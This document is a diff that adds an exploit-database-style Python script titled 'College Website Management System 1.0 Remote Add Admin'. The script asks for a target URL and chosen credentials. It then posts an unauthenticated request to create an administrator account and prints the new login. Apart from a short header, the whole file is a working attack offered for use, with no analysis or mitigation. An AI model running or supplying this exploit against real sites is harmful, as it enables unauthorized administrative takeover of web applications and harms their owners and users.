@@ -1,0 +1,19 @@
+# Exploit Title: College Website Management System 1.0 Remote Add Admin
+# Google Dork: None
+# Date: n/a
+# Exploit Author: Or4nG.M4n
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/cwms.zip
+# Version: 1.0
+
+import requests 
+
+url  = input("Url&path: ")
+user = input("user : ")
+pas  = input("password : ")
+postdata = {'firstname':'firstname','lastname':'lastname','username':user,'password':pas,'type':'1'}
+resp = requests.post("http://"+url, postdata)
+if "2" in resp.text:
+    print("Error ...")
+else:
+    print("[+] user : "+user)
+    print("[+] password : "+pas)
